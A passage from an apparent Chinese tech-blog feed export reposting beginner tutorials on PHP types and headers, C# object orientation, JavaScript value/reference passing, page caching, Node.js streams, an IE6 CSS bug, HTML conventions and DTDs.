3、变量的引用赋值变量总是传值赋值。也就是说，当将一个表达式的值赋予一个变量时，整个原始表达式的值被赋值到目标变量。改变其中一个变量的值，将不会影响到另一个变量。引用赋值，将“&amp;”加到变量前。将变量的引用方式复制给新的变量，指向共同的引用，改变任何一个变量的值，都会影响另一个变量。只有有名字的变量才可以引用赋值。不会将引用赋值的两个变量在内存上同体，只是把各自的值相关联起来，基于这一点，unset()不会导致另一个变量消失。 4、变量的类型4种标量类型：boolean(布尔型)、integer(整型)、float(浮点型)、string(字符串)2种复合类型：array(数组)、object(对象)2种特殊类型：resource(资源)、NULL如果想看某个表达式的值和类型，可以使用函数var_dump()。 布尔类型以下值被认为是false1）布尔值false。2）整型值0(零)为假，-1和其他非零值(不论正负)一样，被认为是true。3）浮点型值0.0（零）。4）空白字符串和字符串“0”5）没有成员变量的数组。6）特殊类型NULL 整型有最大范围2 147 483 647 。PHP不支持无符号整数，如果给定的数超出最大范围，将会被解释为float。 浮点型永远不要比较两个浮点数是否相等。如果需要更高的精度，应该使用任意精度数学函数或gmp()函数。 字符串单引号字符串： 如果要在单引号中引用单引号，需要使用反斜杠()转义。 如果在单引号之前或字符串结尾需要出现一个反斜线，需要用两个反斜线表示。 其中出现的变量不会被变量的值替代。即php不会解析单引号中的变量，而是将变量名原样输出。定义简单字符串时，单引号字符串效率更高。 双引号字符串：其中的变量会被解析。定界符字符串：使用定界符&lt;&lt;&lt;开始，之后提供一个标识符，然后是包含的字符串，最后是同样顶格书写的标识符。定界符文本处理不能初始化类成员以外，表现的就和双引号字符串一样，只是没有双引号。这意味着在定界符文本中不需要转义引号，不过仍然可以用以上列出来的在双引号中可以使用的转义符号。而且定界符中的变量也会被解析，但当在定界符文本中表达复杂变量时和字符串一样同样也需要注意。所以能够很容易地使用定界符定义较长的字符串，通常用于从文本或者数据库中打断地输出文档。 数组(Array)使用print_r()函数查看数组中的全部内容。 对象(Object)&lt;?php class Person{ var $name; function say(){ echo &quot;Doing foo&quot;; } } $p=new Person(); $p-&gt;name=&quot;staven&quot;; $p-&gt;say(); ?&gt; -&gt;：表示对象属性、方法的引用 资源类型(Resource)NULL类型特殊的NULL值表示一个变量没有值，NULL类型唯一可能的值就是NULL。NULL不表示空格，也不表示零，也不是空字符串，而是表示一个变量的值为空。NULL不区分大小写，在下列情况下一个变量被认为是NULL。a）将变量直接赋值为NULL。b）声明的变量尚未被赋值。c）被unset()函数销毁的变量。 伪类型 mixed：说明一个参数可以接受多种不同的(但并不必须是所有的)类型。例如getype()可以接受所有的php类型，str_replace()可以接受字符串和数组。 number：说明一个参数可以是integer或者float。 callback：有些诸如call_user_function()或usort()的函数接受用户自定义的函数作为一个参数。callback函数不仅可以是一个简单的函数，他还可以是一个对象的方法，包括静态类的方法。一个php函数用函数名字符串来传递。可以传递任何内置的或者用户自定义的函数，除了array()，echo()，empty()，eval()，exit()，isset()，list()，print()和unset()。数据类型之间相互转换 自动转换通常发生在不同数据类型的变量混合运算时，若参加元算量的类型不同，则显转换成同一类型，然后在进行运算。通常只有四种标量类型(integer、float、string、boolean)才使用自动类型转换。这并没有改变这些运算书本身的类型，改变的近视这些运算数如何被求值。自动类型转换虽然石油系统自动完成的，但在混合运算时，自动转换要遵循转换按数据长度增加的方向进行，以保证精度不降低。有布尔型值参与运算时，true将转化为整型1，flase将转化为整型0后再参与运算。有NULL值参与运算时，NULL值转化为整型0在进行运算。有integer型和float型参与运算时，先把integer型变量转换成float类型后在进行运算。有字符串和数字型(integer、float)数据参与运算时，字符串先转换为数字，在参与运算。转化后的数字是从字符串开始的数值字符串，如果在字符串开始的数值型字符串不带小数点则转换为integer类型数字。如果带有小数点则转换为float类型数字。 强制类型转换再要转换的变量之前加上用括号括起来的目标类型，也可以使用具体的转换函数，即intval()、floatval()、strval()或者用setType()函数转换类型。intval()、floatval()、strval()强制类型转换没有改变变量本身的类型，而是通过转换将得到的新类型的数据赋值给新的变量，原变量的类型和值不变。如果需要改变自身的类型与值，可以使用setType()函数来设置变量的类型。变量类型的测试函数 is_bool()：判断是否是布尔型。 is_int()、is_integer()和is_long()：判断是否是整型。 is_float()、is_double()和is_real()：判断是否是浮点数。 is_string()：判断是否是字符串。 is_array()：判断是否是数组。 is_object()：判断是否是对象。 is_resource()：判断是否是资源类型。 is_null()：判断是否为空。 is_scalar()：判断是否是标量，也就是一个整数、浮点数、布尔型或字符串。 is_numberic()：判断是否是任何类型的数字或数字字符串。 is_callable()：判断是否是有效的函数名。 三、常量常量只能包含四种标量数据。常量的定义 define(string name，mixed value[,bool case_insensitive]); 第一个参数为常量名，第二个参数为常量的值或表达式，第三个参数是可选的，如果把case_insensitive设为true，则常数将会定义成不区分大小写。如果只想检测是否定义了某常量，用defined()函数。预定义常量 循环语句break 在循环语句中中断循环语句，也就是结束循环语句的执行。 break语句可以将深埋在嵌套循环中的语句退出指定层数或直接退出最外层，break是接受一个可选的数字参数来决定跳出几重语句。break可以跳出几重循环语句或是几重switch语句。 continuecontinue 语句只能使用在循环语句内部，功能是跳过该次循环，继续执行下一次循环结构。在while和do-while语句中continue语句跳转到循环条件处开始继续执行，对于for循环随后的动作是变量更新。接受一个可选数字参数来决定条出多重语句。在循环中遇到continue语句后，就不会执行该循环中位于是continue后的任何语句。continue语句用于结束循环，继续下一次循环。 exit 当前脚本只要执行到exit语句，而不管它在那个结构中都会直接退出当前脚本。exit()是一个函数，die(）函数就是exit()函数的别名，可以带有一个参数输出一条信息，并退出当前脚本。 函数来自为知笔记(Wiz) 转自：http://www.cnblogs.com/staven/p/5142509.html]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[面向对象封装、重载，继承、多态（面向对象三大特性之一）🍑]]></title>
      <url>%2F2016%2F07%2F15%2F49%2F</url>
      <content type="text"><![CDATA[封装目的：保护类，让类更加安全。做法：让类里面的成员变量变为私有的，做相应的方法或者属性去间接的操作成员变量封装成员方法来间接操作类里面的成员变量使用成员属性来间接访问类里面的成员变量访问修饰符private 私有的 只能在该类中访问protected 受保护的 只能在该类和它的子类中访问public 公有的 在任何地方都可以访问构造方法（函数）：作用：造对象所要调用的方法，用来创建对象，可以对成员进行初始化每一个类都有一个构造方法，不写也有只不过看不到而已特殊性：写法特殊 执行时间特殊函数重载函数重载需要的条件：函数名要相同，参数的个数或者参数的类型不同 this关键字虽然写在类里面，但不是属于类的，而是属于该对象的一般来说在类里面 this关键字是可以省略的，但是如果有一个方法形参名字和成员名字重复，这时候再调用该对象里面的成员的时候需要加this关键字 is关键字判断变量是不是属于某个类型 if (y2 is Ren) { s = &quot;是一个人&quot;; } else { s = &quot;不是一个人&quot;; } as关键字转换类型（只能转换兼容类型，可以将子类对象转换为父类对象） 继承子类可以继承父类的一切特点：单继承一个子类只能有一个父类 一个父类可以有多个子类C#特殊点：所有类的祖先都是objectbase关键字：在子类中代表父类对象，用法和this关键字相同如果父类有构造方法，那么子类也要有构造方法，如果父类构造需要参数，那么子类构造也必须有相应的参数。子类构造后面可以通过base调用父类的构造方法 public China(string m):base(m) { } sealed关键字：密封类 该类不可以被继承部分类：partial 可以将一个类拆分成多个部分，分别放在多个文件内namespace 命名空间 相当于虚拟文件夹 多态：1.编译多态函数重载2.运行多态概念：当父类引用指向子类实例的时候，由于子类对父类的方法进行了重写，在调用该方法的时候表现出的不同就称为多态条件：必须要有继承 父类引用指向子类实例 子类必须对父类的方法进重写里氏代换原则：如果有一个地方需要使用到父类对象，那么你可以将一个子类对象给他 转自：http://www.cnblogs.com/dreamer666/p/5761365.html]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[一些常用php的header头🍒]]></title>
      <url>%2F2016%2F07%2F11%2F48%2F</url>
      <content type="text"><![CDATA[1 [代码][PHP]代码 &lt;?php header(&apos;HTTP/1.1 200 OK&apos;); // ok 正常访问 header(&apos;HTTP/1.1 404 Not Found&apos;); //通知浏览器 页面不存在 header(&apos;HTTP/1.1 301 Moved Permanently&apos;); //设置地址被永久的重定向 301 header(&apos;Location: http://www.ruonu.com/&apos;); //跳转到一个新的地址 header(&apos;Refresh: 10; url=http://www.ruonu.com/&apos;); //延迟转向 也就是隔几秒跳转 header(&apos;X-Powered-By: PHP/6.0.0&apos;); //修改 X-Powered-By信息 header(&apos;Content-language: en&apos;); //文档语言 header(&apos;Content-Length: 1234&apos;); //设置内容长度 header(&apos;Last-Modified: &apos;.gmdate(&apos;D, d M Y H:i:s&apos;, $time).&apos; GMT&apos;); //告诉浏览器最后一次修改时间 header(&apos;HTTP/1.1 304 Not Modified&apos;); //告诉浏览器文档内容没有发生改变 ###内容类型### header(&apos;Content-Type: text/html; charset=utf-8&apos;); //网页编码 header(&apos;Content-Type: text/plain&apos;); //纯文本格式 header(&apos;Content-Type: image/jpeg&apos;); //JPG、JPEG header(&apos;Content-Type: application/zip&apos;); // ZIP文件 header(&apos;Content-Type: application/pdf&apos;); // PDF文件 header(&apos;Content-Type: audio/mpeg&apos;); // 音频文件 header(&apos;Content-type: text/css&apos;); //css文件 header(&apos;Content-type: text/javascript&apos;); //js文件 header(&apos;Content-type: application/json&apos;); //json header(&apos;Content-type: application/pdf&apos;); //pdf header(&apos;Content-type: text/xml&apos;); //xml header(&apos;Content-Type: application/x-shockw**e-flash&apos;); //Flash动画 ###### ###声明一个下载的文件### header(&apos;Content-Type: application/octet-stream&apos;); header(&apos;Content-Disposition: attachment; filename=&quot;ITblog.zip&quot;&apos;); header(&apos;Content-Transfer-Encoding: binary&apos;); readfile(&apos;test.zip&apos;); ###### ###对当前文档禁用缓存### header(&apos;Cache-Control: no-cache, no-store, max-age=0, must-revalidate&apos;); header(&apos;Expires: Mon, 26 Jul 1997 05:00:00 GMT&apos;); ###### ###显示一个需要验证的登陆对话框### header(&apos;HTTP/1.1 401 Unauthorized&apos;); header(&apos;WWW-Authenticate: Basic realm=&quot;Top Secret&quot;&apos;); ###### ###声明一个需要下载的xls文件### header(&apos;Content-Disposition: attachment; filename=ithhc.xlsx&apos;); header(&apos;Content-Type: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet&apos;); header(&apos;Content-Length: &apos;.filesize(&apos;./test.xls&apos;)); header(&apos;Content-Transfer-Encoding: binary&apos;); header(&apos;Cache-Control: must-revalidate&apos;); header(&apos;Pragma: public&apos;); readfile(&apos;./test.xls&apos;); ###### ?&gt; 转自：https://www.oschina.net/code/snippet_2246563_46010]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS 传值 传址🍤]]></title>
      <url>%2F2016%2F07%2F09%2F47%2F</url>
      <content type="text"><![CDATA[在JS中，有两种不同的方式可以操作数据的值，这两种技术分别叫做 传值 和 传址。传值：在赋值过程中，首先对值进行了一份拷贝，而后将这份拷贝存储到一个变量、对象属性或数组元素中。拷贝的值和原始的值是完全独立、互不影响的。当一份数据通过值传递给一个函数，实际上被传递的不是数据本身，而是数据的一份拷贝。因此，如果函数修改了这个值，影响到的只是数据的那份拷贝，而并不影响数据本身。传址：在赋值过程中，变量实际上存储的是数据的地址（对数据的引用），而不是原始数据或者是数据的拷贝。如果值通过一个地址发生了改变，这个改变也会通过原始地址表现出来。根据操作数据方式的不同，我们可以把数据类型分为两类：基础类型 和 引用类型。基础类型主要有：数字(Number)、布尔类型(Boolean)、字符串(String);其操作方式为 传值。引用类型主要有：对象(Object) —— 数组(Array)、函数(Function);其操作方式为 传址。以数字为例： var n = 1; var m = n; function total(x,y){ x = x + y; } total(n,m); if(n == 1){ alert(1); } 执行结果：输出1以函数为例： function a(){ var x = {&apos;n&apos;:1}; var y = x; x.n = 2; console.log(y); }; a(); 执行结果：{‘n’:2}以数组为例： function b(){ var x = [1,2]; var y = x; y[2] = 3; console.log(x); }; b(); 执行结果：[1,2,3] 转自:http://www.cnblogs.com/diva/p/3169725.html]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[分享常见的几种页面静态化的方法🌺]]></title>
      <url>%2F2016%2F07%2F08%2F46%2F</url>
      <content type="text"><![CDATA[常说的页面静态化分为两种，一种是伪静态，即url 重写，一种是真静态化。我们以真静态化为主来讲讲 什么是PHP静态化PHP静态化的简单理解就是使网站生成页面以静态HTML的形式展现在访客面前，PHP静态化分纯静态化和伪静态化，两者的区别在于PHP生成静态页面的处理机制不同。 为什么要让网页静态化 加快页面打开浏览速度，静态页面无需连接数据库打开速度较动态页面有明显提高； 有利于搜索引擎优化SEO，Baidu、Google都会优先收录静态页面，不仅被收录的快还收录的全； 减轻服务器负担，浏览网页无需调用系统数据库； 网站更安全，HTML页面不会受php相关漏洞的影响； 观看一下大一点的网站基本全是静态页面，而且可以减少攻击，防sql注入。 数据库出错时，不影响网站正常访问。生成html文章虽操作上麻烦些，程序上繁杂些，但为了更利于搜索，为了速度更快些，更安全，这些牺牲还是值得的。 PHP生成静态HTML页面的方法利用PHP模板生成静态页面PHP模板实现静态化非常方便，比如安装和使用PHP Smarty实现网站静态化，也可以自己写一套模板解析规则，常见的可以模仿各类cms的模板规则。 1.使用PHP文件读写功能与ob缓存机制生成静态页面比如某个商品的动态详情页地址是: http://xxx.com?goods.php?gid=112那么这里我们根据这个地址读取一次这个详情页的内容，然后保存为静态页，下次有人访问这个商品详情页动态地址时，我们可以直接把已生成好的对应静态内容文件输出出来。 &lt;!--?php $gid = $_GET[&apos;gid&apos;]+0;//商品id $goods_statis_file = &quot;goods_file_&quot;.$gid.&quot;.html&quot;;//对应静态页文件 $expr = 3600*24*10;//静态文件有效期，十天 if(file_exists($goods_statis_file)){ $file_ctime =filectime($goods_statis_file);//文件创建时间 if($file_ctime+$expr--&gt;time()){//如果没过期 echo file_get_contents($goods_statis_file);//输出静态文件内容 exit; }else{//如果已过期 unlink($goods_statis_file);//删除过期的静态页文件 ob_start(); //从数据库读取数据，并赋值给相关变量 //include (&quot;xxx.html&quot;);//加载对应的商品详情页模板 $content = ob_get_contents();//把详情页内容赋值给$content变量 file_put_contents($goods_statis_file,$content);//写入内容到对应静态文件中 ob_end_flush();//输出商品详情页信息 } }else{ ob_start(); //从数据库读取数据，并赋值给相关变量 //include (&quot;xxx.html&quot;);//加载对应的商品详情页模板 $content = ob_get_contents();//把详情页内容赋值给$content变量 file_put_contents($goods_statis_file,$content);//写入内容到对应静态文件中 ob_end_flush();//输出商品详情页信息 } ?&gt; 2.使用nosql从内存中读取内容(其实这个已经不算静态化了而是缓存);以memcache为例： &lt;!--?php $gid = $_GET[&apos;gid&apos;]+0;//商品id $goods_statis_content = &quot;goods_content_&quot;.$gid;//对应键 $expr = 3600*24*10;//有效期，十天 $mem = new Memcache; $mem---&gt;connect(&apos;memcache_host&apos;, 11211); $mem_goods_content = $mem-&gt;get($goods_statis_content); if($mem_goods_content){ echo $mem_goods_content; }else{ ob_start(); //从数据库读取数据，并赋值给相关变量 //include (&quot;xxx.html&quot;);//加载对应的商品详情页模板 $content = ob_get_contents();//把详情页内容赋值给$content变量 $mem-&gt;add($goods_statis_content,$content, false, $expr); ob_end_flush();//输出商品详情页信息 } ?&gt; memcached是键值一一对应，key默认最大不能超过128个字节，value默认大小是1M，因此1M大小满足大多数网页大小的存储。以上就是页面静态化的相关方法，希望对朋友们有所帮助 转自：http://www.jb51.net/article/59619.htm]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Node.js Stream(流)🍅]]></title>
      <url>%2F2016%2F07%2F02%2F45%2F</url>
      <content type="text"><![CDATA[Stream 是一个抽象接口，Node 中有很多对象实现了这个接口。例如，对http 服务器发起请求的request 对象就是一个 Stream，还有stdout（标准输出）。Node.js，Stream 有四种流类型： Readable - 可读操作。 Writable - 可写操作。 Duplex - 可读可写操作。 Transform - 操作被写入数据，然后读出结果。 所有的 Stream 对象都是 EventEmitter 的实例。常用的事件有： data - 当有数据可读时触发。 end - 没有更多的数据可读时触发。 error - 在接收和写入过程中发生错误时触发。 finish - 所有数据已被写入到底层系统时触发。 本教程会为大家介绍常用的流操作。 从流中读取数据创建 input.txt 文件，内容如下： 菜鸟教程官网地址：www.runoob.com 创建 main.js 文件, 代码如下： var fs = require(&quot;fs&quot;); var data = &apos;&apos;; // 创建可读流 var readerStream = fs.createReadStream(&apos;input.txt&apos;); // 设置编码为 utf8。 readerStream.setEncoding(&apos;UTF8&apos;); // 处理流事件 --&gt; data, end, and error readerStream.on(&apos;data&apos;, function(chunk) { data += chunk; }); readerStream.on(&apos;end&apos;,function(){ console.log(data); }); readerStream.on(&apos;error&apos;, function(err){ console.log(err.stack); }); console.log(&quot;程序执行完毕&quot;); 以上代码执行结果如下： 程序执行完毕 菜鸟教程官网地址：www.runoob.com 写入流创建 main.js 文件, 代码如下： var fs = require(&quot;fs&quot;); var data = &apos;菜鸟教程官网地址：www.runoob.com&apos;; // 创建一个可以写入的流，写入到文件 output.txt 中 var writerStream = fs.createWriteStream(&apos;output.txt&apos;); // 使用 utf8 编码写入数据 writerStream.write(data,&apos;UTF8&apos;); // 标记文件末尾 writerStream.end(); // 处理流事件 --&gt; data, end, and error writerStream.on(&apos;finish&apos;, function() { console.log(&quot;写入完成。&quot;); }); writerStream.on(&apos;error&apos;, function(err){ console.log(err.stack); }); console.log(&quot;程序执行完毕&quot;); 以上程序会将 data 变量的数据写入到 output.txt 文件中。代码执行结果如下： $ node main.js 程序执行完毕 写入完成。 查看 output.txt 文件的内容： $ cat output.txt 菜鸟教程官网地址：www.runoob.com 管道流管道提供了一个输出流到输入流的机制。通常我们用于从一个流中获取数据并将数据传递到另外一个流中。如上面的图片所示，我们把文件比作装水的桶，而水就是文件里的内容，我们用一根管子(pipe)连接两个桶使得水从一个桶流入另一个桶，这样就慢慢的实现了大文件的复制过程。以下实例我们通过读取一个文件内容并将内容写入到另外一个文件中。设置 input.txt 文件内容如下： 菜鸟教程官网地址：www.runoob.com 管道流操作实例 创建 main.js 文件, 代码如下： var fs = require(&quot;fs&quot;); // 创建一个可读流 var readerStream = fs.createReadStream(&apos;input.txt&apos;); // 创建一个可写流 var writerStream = fs.createWriteStream(&apos;output.txt&apos;); // 管道读写操作 // 读取 input.txt 文件内容，并将内容写入到 output.txt 文件中 readerStream.pipe(writerStream); console.log(&quot;程序执行完毕&quot;); 代码执行结果如下： $ node main.js 程序执行完毕 查看 output.txt 文件的内容： $ cat output.txt 菜鸟教程官网地址：www.runoob.com 管道流操作实例 链式流链式是通过连接输出流到另外一个流并创建多个对个流操作链的机制。链式流一般用于管道操作。接下来我们就是用管道和链式来压缩和解压文件。创建 compress.js 文件, 代码如下： var fs = require(&quot;fs&quot;); var zlib = require(&apos;zlib&apos;); // 压缩 input.txt 文件为 input.txt.gz fs.createReadStream(&apos;input.txt&apos;) .pipe(zlib.createGzip()) .pipe(fs.createWriteStream(&apos;input.txt.gz&apos;)); console.log(&quot;文件压缩完成。&quot;); 代码执行结果如下： $ node compress.js 文件压缩完成。 执行完以上操作后，我们可以看到当前目录下生成了 input.txt 的压缩文件 input.txt.gz。接下来，让我们来解压该文件，创建 decompress.js 文件，代码如下： var fs = require(&quot;fs&quot;); var zlib = require(&apos;zlib&apos;); // 解压 input.txt.gz 文件为 input.txt fs.createReadStream(&apos;input.txt.gz&apos;) .pipe(zlib.createGunzip()) .pipe(fs.createWriteStream(&apos;input.txt&apos;)); console.log(&quot;文件解压完成。&quot;); 代码执行结果如下： $ node decompress.js 文件解压完成。 转自：菜鸟教程]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[IE6双边距bug及其解决办法🎄]]></title>
      <url>%2F2016%2F06%2F28%2F44%2F</url>
      <content type="text"><![CDATA[&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt; &lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt; &lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=gb2312&quot; /&gt; &lt;title&gt;无标题文档&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; body,div{ margin:0; padding:0; } #div1{ width:200px; height:200px; background:#900; margin:20px 0 0 20px; float:left; } #div2{ width:300px; height:200px; background:#009; margin:20px 0 0 20px; float:left; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&quot;div1&quot;&gt; &lt;/div&gt; &lt;div id=&quot;div2&quot;&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 上面这段代码，在IE6和FF中的显示结果分别如下图所示：IE6：FF：可以看到，在IE6中显示的红色区域的左边距实际为40px，是CSS代码中设置的20px的两倍，这是IE6的双边距BUG。当满足下面这三个条件时，就会出现这个BUG： 要为块状元素； 要左侧浮动； 要有左外边距（margin-left）。 解决这个BUG，只需在相应的块状元素的CSS属性中加入“display:inline;”。以上内容总结源于文档《2天驾驭div css》，但经过搜索网上的相关文档学习发现了一些更深的现象、原因及解决办法，补充如下：出现双边距的条件是当浮动元素的浮动方向和margin的方向一致时才会出现。也就是说，并不是只有块状元素左浮动，且具有左外边距时才有这个BUG，当一个盒子右浮动的同时有一个向右的margin-right的时候，IE6也会把margin-right解析为原来的2倍。当有多个同行元素都浮动了，而且都有同方向的margin，则只有最靠近浮动方向的元素有双边距bug。解决这个bug有两个方法： 给float的元素添加一个display：inline 给ie6写一个hack，其值是正常值的一半，即_margin-right:10px;这个方法不推荐，因为要加hack写法，而这个是要尽量避免写的。但是这个正好能够说明这个bug的真实存在。 本来以为，将display设置为inline后，就改变了BUG产生的条件之一，即必须是块状元素。但是后来又看到了下面这段话：“熟悉规则的人知道浮动元素自动设置为”block”元素，而不管他们之前是什么。这说明浮动元素上的{display: inline;}会被忽略，事实上所有的浏览器没有呈现任何改变，包括IE。但是，它不知何故让IE停止将浮动元素的边界翻倍。” 转自：http://blog.sina.com.cn/s/blog_4a0c5a9401014upw.html]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[HTML编码规范🎁]]></title>
      <url>%2F2016%2F06%2F25%2F43%2F</url>
      <content type="text"><![CDATA[1.黄金法则（Golden rule）不管有多少人参与同一个项目，一定要确保每一行代码都像是同一个人编写的。Every line of code should appear to be written by a single person, no matter the number of contributors.这就需要在一个项目中，我们永远遵循同一套编码规范。在项目开发前，制定一套行之有效的编码规范，每个项目组成员都要按这个规范来编码。 2.命名规范 CSS 文件名使用英文小写，多个单词时，中间用下划线（_）连接，如：index.html web-guide.html id 命名使用英文驼峰命名法，多采用语义化来命名 自定义属性采用英文小写命名，多个单词时，中间用中划线（-）连接，如：generate-catalogue 以 data- 开始的属性名，是用来存储数据的，具体可参考 W3C Html 5 data- 。html可以通过 dataset 来取属性中的值，对于不支持的浏览器，可以通过getAttribute来获取。例如：data-city=”ShangHai” ，如果对应的html标签id为 cityList，则 document.getElementById(‘cityList’).dataset(‘city’); 对于不支持的浏览器，应该document.getElementById(‘cityList’).getAttribute(‘-data-city’); 3.书写规范3.1 语法 使用两个空格来代替制表符（tab）作为缩进，— 这是保证代码在各种环境下显示一致的唯一方式 嵌套元素应当缩进一次（即两个空格） 对于属性中的值，确保全部使用双引号，不要使用单引号，也不要省略引号 不要在自闭合（self-closing）元素的尾部添加斜线 — HTML5 规范 中明确说明这是可选的 不要省略可选的结束标签（closing tag）（例如， 或 ） 不要一行写太长的html代码，建议设置最大长度为120列，超过120列是最好换行书写，方便阅读和排版 嵌套元素最好单独写在一行 行内元素中不要嵌套块级元素，比如：不推荐写法 p标签中是不能嵌套块级元素的，浏览器会解析为两个独立的标签，而不能到达你想要的结果 3.2 HTML5 doctype为每个 HTML 页面的第一行添加标准模式（standard mode）的声明，这样能够确保在每个浏览器中拥有一致的展现。 3.3 语言属性 Language attribute根据 HTML5 规范：强烈建议为 html 根元素指定 lang 属性，从而为文档设置正确的语言。这将有助于语音合成工具确定其所应该采用的发音，有助于翻译工具确定其翻译时所应遵守的规则等等。更多关于 lang 属性的知识可以从 此规范 中了解。 3.4 IE 兼容模式nternet Explorer 支持使用 标签来指定使用什么版本的 IE 来渲染页面。除非有强烈的特殊需求，否则最好设置为 edge mode，从而让 IE 采用其所支持的最新模式来渲染。 &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=Edge&quot;&gt; 具体信息可以参考 这里 3.5 字符编码通过声明一个明确的字符编码，让浏览器正确的呈现内容，防止出现乱码，通常字符编码为 UTF-8 &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;/head&gt; 3.6 引入 CSS 和 JavaScript 文件根据 HTML5 规范，在引入 CSS 和 JavaScript 文件时一般不需要指定 type 属性，因为 text/css 和 text/javascript 分别是它们的默认值。 &lt;!-- External CSS --&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;code-guide.css&quot;&gt; &lt;!-- JavaScript --&gt; &lt;script src=&quot;code-guide.js&quot;&gt;&lt;/script&gt; 3.7 实用高于完美尽量遵循 HTML 标准和语义，但是不应该以浪费实用性作为代价。任何时候都要用尽量小的复杂度和尽量少的标签来解决问题。 3.8 属性顺序HTML 属性应当按照以下给出的顺序依次排列，确保代码的易读性。 class id, name data-* src, for, type, href title, alt aria-*, role class 用于标识高度可复用组件，因此应该放在首位。id 用于标识具体组件，应该尽量少使用（例如，页面内的书签），因此排在第二位。以上顺序也不一定是绝对的，可以根据需要把常用的放在首位 3.9 布尔（boolean）型属性Boolean 属性指不需要声明值的属性。XHTML 需要每个属性声明值，但是 HTML5 并不需要。了解更多内容，参考 WhatWG section on boolean attributes一个元素中 Boolean 属性的存在表示取值 true，不存在则表示取值 false。如果一定要为其赋值的话，请参照 WhatWG 中的说明。如果属性存在，其值必须是空字符串或 […] 属性的本身名称，并且不要在首尾添加空白符。简单来说，就是不用赋值。 &lt;input type=&quot;text&quot; disabled&gt; &lt;input type=&quot;checkbox&quot; value=&quot;1&quot; checked&gt; &lt;select&gt; &lt;option value=&quot;1&quot; selected&gt;1&lt;/option&gt; &lt;/select&gt; &lt;!--不建议 --&gt; &lt;input type=&quot;text&quot; value=&quot;1&quot; readonly=&quot;readonly&quot; disabled=&quot;disabled&quot;&gt; 虽然 HTML5是这样规定的，但是对于IE浏览器，如果不指定属性值，有时会有问题的，尤其是readonly和 disabled ，所以最好还是设置为 readonly=”readonly” disabled=”disabled” 3.10 减少标签嵌套的数量在编写 HTML 代码时，尽量避免多余的父节点。很多时候，需要通过迭代和重构来使 HTML 变得更少。 请看下面的例子 &lt;!-- Not so great --&gt; &lt;span class=&quot;avatar&quot;&gt; &lt;img src=&quot;...&quot;&gt; &lt;/span&gt; &lt;!-- Better --&gt; &lt;img class=&quot;avatar&quot; src=&quot;...&quot;&gt; 3.11 避免利用JavaScript 生成标签或html片段通过 JavaScript 生成的标签或html片段让内容变得不易查找、编辑，并且降低性能。能避免时尽量避免，我们可以采用模板的方式来处理，常用的模板有handlebars（模板引擎类），Ember.js 就采用该模板引擎knockoutjs，除了支持模板，他还是一个轻量级的MVVM框架mustashe， 一个模板引擎JsRender，一个非常好用的html模板引擎类在不引入其他mvc或mvvm框架的前提下，采用 JsRender 或 handlebars 来处理html模板，这两个模板支持循环、条件语句，还支持在模板中动态执行JavaScript脚本（不建议这样做）。当然我们还可以引入MVC框架，这些框架一般都自带模板处理引擎，比如Angular、Ember、KnockoutJs等 4.语义化命名和语义化标签我们尽量多采用语义化来命名id，并且采用语义化标签来书写html代码，多用html5中新增的标签来书写。 5.Emmet帮助我们快速书写html代码转自：https://segmentfault.com/a/1190000003229217]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[DTD详解🔔]]></title>
      <url>%2F2016%2F06%2F20%2F42%2F</url>
      <content type="text"><![CDATA[前几天@老赵还在微薄上问一个&lt; textarea &gt;和&lt; div &gt;设置了同样的宽度，但最后解析出来不一样的问题。最后的原因是由于设置了html 4.0的DTD导致的。也许说到DTD大家可能都知道DTD是文档类型定义的意思，那么具体的用法大家有没有了解过？也许你的很多问题可能就是DTD的差异导致的。今天，带大家来一起详细的探讨下，看看这个究竟是个神马东西。 定义和用法DTD是一种保证html文档格式正确的有效方法，可以通过比较html文档和DTD文件来看文档是否符合规范，以及元素和标签使用是否正确。一个DTD文档包含元素的定义规则、元素间关系的定义规则、元素可使用的属性、可使用的实体和符号规则。DTD要通过&lt;!DOCTYPE&gt;标签来申明， &lt;!DOCTYPE&gt;位于文档中的最前面的位置，处于 标签之前。此标签可告知浏览器文档使用哪种 HTML 或 XHTML 规范。按照W3C的标准，我们需要在html的最开始申明文件的DTD类型。如果漏写DTD申明，Firefox仍然会按照标准模式来解析网页，但在IE中就会触发怪异模式。在table布局时代，盒模型和CSS我们都接触的比较少，所以DTD申明并不是很重要，被我们忽视了。到了CSS布局时代，DTD的申明就变得非常重要了。为了避免怪异模式给我们带来不必要的麻烦，我们要养成书写DTD申明的好习惯以下面这个 &lt;!DOCTYPE&gt; 标签为例： &lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt; 在上面的声明中，声明了文档的根元素是 html，它在公共标识符被定义为 “-//W3C//DTD XHTML 1.0 Strict//EN” 的 DTD 中进行了定义。浏览器将明白如何寻找匹配此公共标识符的 DTD。如果找不到，浏览器将使用公共标识符后面的 URL 作为寻找 DTD 的位置。感兴趣的同学可以打开http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd这个地址看看，这个DTD有979行的xml代码。来看如下代码 &lt;!--=================== Generic Attributes ===============================--&gt; &lt;!-- core attributes common to most elements id document-wide unique id class space separated list of classes style associated style info title advisory title/amplification --&gt; &lt;!ENTITY % coreattrs &quot;id ID #IMPLIED class CDATA #IMPLIED style %StyleSheet; #IMPLIED title %Text; #IMPLIED&quot; &gt; 以上代码规定了标签的通用属性(id、class、style、title)再比如下面这段代码 